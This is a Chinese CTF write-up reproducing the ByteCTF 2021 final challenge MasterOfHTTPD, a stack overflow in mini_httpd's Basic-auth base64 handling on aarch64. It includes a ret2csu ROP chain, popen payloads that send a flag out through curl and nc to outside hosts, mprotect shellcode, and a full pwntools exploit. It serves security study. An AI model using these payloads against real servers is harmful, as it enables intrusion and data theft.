@@ -1,0 +1,193 @@
+# ByteCTF2021决赛 MasterOfHTTPD 复现与简要分析
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+队内大哥太顶了，大哥都快出了，我才找到漏洞位置ahhh，在赛后重新复现一下。
+## 0x00 漏洞分析
+首先通过ida分析，发现是个aarch64架构的mini_httpd，版本号为1.30。
+mini_httpd是一个开源的小型HTTP服务器，我们从[这里](https://acme.com/software/mini_httpd/)下载源码，一方面是便于理解server工作逻辑；一方面是通过交叉编译，可以恢复大部分函数符号表，便于我们寻找漏洞点。
+下载完源码之后我们修改文件夹中的makefile，将原始的编译工具指向aarch64架构的交叉编译工具，同时将去符号编译的选项注释。
+直接进行一个make，可能会有链接库错误，提示crypt库不存在，在网上找一下对应版本的libcrypt库导入到本地的链接库文件夹即可。
+重新make，得到带符号表的自己编译的mini_httpd
+ida打开题目中的mini_httpd，并通过bindiff，将题目和自编译的mini_httpd进行比较，我们就可以恢复出题目中的大部分函数符号。
+注意到在xcrypt的相似度与可信度最低，开始从这里分析，在这个函数中首先进行了base64的解密，然后调用了一个函数，根据传入的参数，在这个函数调用memcpy造成了0x77字节的栈溢出。
+接下来是触发这个漏洞，通过对server的逆向和源码的阅读，漏洞在server进行basic认证时触发的，在mini_httpd中是通过对被访问资源的所在文件夹下是否存在`.htpasswd`来判断当前请求的资源是否需要认证，所以在比赛的过程中需要对靶机上的目录进行扫描，发现`/admin`路径下返回401状态码，需要认证。
+## 0x01 漏洞利用
+注意到，程序首先是从套接字读入所有输入保存在bss段上，再逐个字段对报文进行分析提取、申请堆保存，这就意味着，存在一个已知地址的内存，供我们保存相关字符串，来进行利用。
+###  aarch64下的ret2csu
+aarch64下的ret2csu和x86下的大致一致，我们都可以利用这段gadget，来控制寄存器调用任意函数。首先通过0x407d9c这段依次对x20、x21、x22、x23、x24、x29、x30寄存器进行赋值，通过ret跳转至0x407d78，在对调用函数的参数进行布置，最后进行调用。
+    def ret2csu(func_addr, arg0, arg1, arg2, ret):
+        payload = p64(csu1_addr)
+        payload += p64(0) * 2  # padding
+        payload += p64(0x423000)  #  x29
+        payload += p64(csu2_addr)  # x30
+        payload += p64(0)
+        payload += p64(1)  # x20
+        payload += p64(func_addr)  # x21
+        payload += p64(arg0)  # x22 (x0)
+        payload += p64(arg1)  # x23 (x1)
+        payload += p64(arg2)  # x24 (x2)
+        payload += p64(0)  
+        payload += p64(ret)  
+        return payload
+接下来我们通过两种方式来获得flag。
+###  回传flag到VPS
+server中引入了popen函数，可供我们进行rce。在bss段中布置相关command和popen的plt地址，然后构造ret2csu的链，利用ret2csu调用popen来执行任意指令，在这里我们使用curl结合反引号来进行数据的回传。
+    def gen1():
+        bss_plt_addr = 0x423280 + 0x300
+        cmd_addr = 0x423280 + 0x308
+        mode_addr = 0x423280 + 0x2e0
+        popen_plt = 0x401BC0
+        message = "GET /admin/ HTTP/1.1\r\n"
+        message += "Authorization: Basic {0}\r\n"
+        message += "\r\n"
+        payload = b'a' * 0x108
+        payload += ret2csu(bss_plt_addr, cmd_addr, mode_addr, 0, 0)
+        message = message.format(b64encode(payload).decode()).encode()
+        message = message.ljust(0x2e0, b'\x00')
+        message += b'r\x00'
+        message = message.ljust(0x300, b'\x00')
+        message += p64(popen_plt)
+        message += b'curl http://127.0.0.1:23334 -X POST -d `cat flag`'
+        return message
+###  利用shellcode读取flag写入套接字输出流
+server中还引入了mprotect函数，首先通过ret2csu调用mprotect，将bss段所在页改为可执行页，再跳转至shellcode，shellcode是将flag读入并输出到套接字输出流中，socket连接的文件描述符需要多尝试几次即可成功。
+    def gen2():
+        bss_plt_addr = 0x423280 + 0x300
+        mprotect_plt = 0x401F20
+        flag_addr = 0x423280 + 0x500
+        shellcode_addr = 0x423280 + 0x308
+        strflag_addr = 0x423280 + 0x2e0
+        message = "GET /admin/ HTTP/1.1\r\n"
+        message += "Authorization: Basic {0}\r\n"
+        message += "\r\n"
+        payload = b'a' * 0x108
+        payload += ret2csu(bss_plt_addr, 0x423280 & 0xfff000, 0x2000, 7, shellcode_addr)
+        shellcode = f'''
+        /*openat(-100,"flag",0,0)*/
+        mov x0,#0xff9c
+        movk x0, #0xffff, lsl #0x10
+        movk x0, #0xffff, lsl #0x20
+        movk x0, #0xffff, lsl #0x30
+        mov x1, #{strflag_addr&0xffff}
+        movk x1, #{strflag_addr>>16}, lsl #0x10
+        mov x2, #0
+        mov x3, #0
+        mov x8, #0x38
+        svc 0
+        /*read(fd,flag_addr,0x100)*/
+        mov x1, #{flag_addr&0xffff}
+        movk x1, #{flag_addr>>16}, lsl #0x10
+        mov x2, #0x100
+        mov x8, #0x3f
+        svc 0
+        /*write(6,flag_addr,0x100)*/
+        mov x0, #6
+        mov x1, #{flag_addr&0xffff}
+        movk x1, #{flag_addr>>16}, lsl #0x10
+        mov x2, #0x100
+        mov x8, #0x40
+        svc 0
+        '''
+        message = message.format(b64encode(payload).decode()).encode()
+        message = message.ljust(0x2e0, b'\x00')
+        message += b'/flag\x00'
+        message = message.ljust(0x300, b'\x00')
+        message += p64(mprotect_plt)
+        message += asm(shellcode)
+        return message
+###  完整exp
+    #!/usr/bin/python3
+    # coding=utf-8
+    from pwn import *
+    from base64 import b64encode
+    context.arch = 'aarch64'
+    debug = 1
+    ip = '10.205.45.177'
+    port = 12346
+    if debug:
+        context.log_level = 'debug'
+    io = remote(ip, port)
+    csu1_addr = 0x407d9c
+    csu2_addr = 0x407d78
+    def ret2csu(func_addr, arg0, arg1, arg2, ret):
+        payload = p64(csu1_addr)
+        payload += p64(0) * 2  # padding
+        payload += p64(0x423000)  #  x29
+        payload += p64(csu2_addr)  # x30
+        payload += p64(0)
+        payload += p64(1)  # x20
+        payload += p64(func_addr)  # x21
+        payload += p64(arg0)  # x22 (x0)
+        payload += p64(arg1)  # x23 (x1)
+        payload += p64(arg2)  # x24 (x2)
+        payload += p64(0)  
+        payload += p64(ret)  
+        return payload
+    def gen1():
+        bss_plt_addr = 0x423280 + 0x300
+        cmd_addr = 0x423280 + 0x308
+        mode_addr = 0x423280 + 0x2e0
+        popen_plt = 0x401BC0
+        message = "GET /admin/ HTTP/1.1\r\n"
+        message += "Authorization: Basic {0}\r\n"
+        message += "\r\n"
+        payload = b'a' * 0x108
+        payload += ret2csu(bss_plt_addr, cmd_addr, mode_addr, 0, 0)
+        message = message.format(b64encode(payload).decode()).encode()
+        message = message.ljust(0x2e0, b'\x00')
+        message += b'r\x00'
+        message = message.ljust(0x300, b'\x00')
+        message += p64(popen_plt)
+        message += b'cat flag | nc 10.205.45.171 23333\x00'
+        return message
+    def gen2():
+        bss_plt_addr = 0x423280 + 0x300
+        mprotect_plt = 0x401F20
+        flag_addr = 0x423280 + 0x500
+        shellcode_addr = 0x423280 + 0x308
+        strflag_addr = 0x423280 + 0x2e0
+        message = "GET /admin/ HTTP/1.1\r\n"
+        message += "Authorization: Basic {0}\r\n"
+        message += "\r\n"
+        payload = b'a' * 0x108
+        payload += ret2csu(bss_plt_addr, 0x423280 & 0xfff000, 0x2000, 7, shellcode_addr)
+        shellcode = f'''
+        /*openat(-100,"flag",0,0)*/
+        mov x0,#0xff9c
+        movk x0, #0xffff, lsl #0x10
+        movk x0, #0xffff, lsl #0x20
+        movk x0, #0xffff, lsl #0x30
+        mov x1, #{strflag_addr&0xffff}
+        movk x1, #{strflag_addr>>16}, lsl #0x10
+        mov x2, #0
+        mov x3, #0
+        mov x8, #0x38
+        svc 0
+        /*read(8,flag_addr,0x100)*/
+        mov x0, #8
+        mov x1, #{flag_addr&0xffff}
+        movk x1, #{flag_addr>>16}, lsl #0x10
+        mov x2, #0x100
+        mov x8, #0x3f
+        svc 0
+        /*write(6,flag_addr,0x100)*/
+        mov x0, #6
+        mov x1, #{flag_addr&0xffff}
+        movk x1, #{flag_addr>>16}, lsl #0x10
+        mov x2, #0x100
+        mov x8, #0x40
+        svc 0
+        '''
+        message = message.format(b64encode(payload).decode()).encode()
+        message = message.ljust(0x2e0, b'\x00')
+        message += b'flag\x00'
+        message = message.ljust(0x300, b'\x00')
+        message += p64(mprotect_plt)
+        message += asm(shellcode)
+        return message
+    io.sendline(gen1())
+    io.interactive()
+## 0x02 总结
+这道题的难点在于需要对server进行快速的分析，在这里使用一些其他方法(比如自编译进行bindiff，下载源码的进行阅读等)，而不是逆向死磕可能会高效很多，这道题的利用是相对简单的。对于异构题目来说，最大的难度永远是调试环境，无论是这道题还是决赛的另一道题目ezsc，在qemu中调试都出现难以理解、搞人心态的问题，看来arm的真机调试环境是必备的(x。
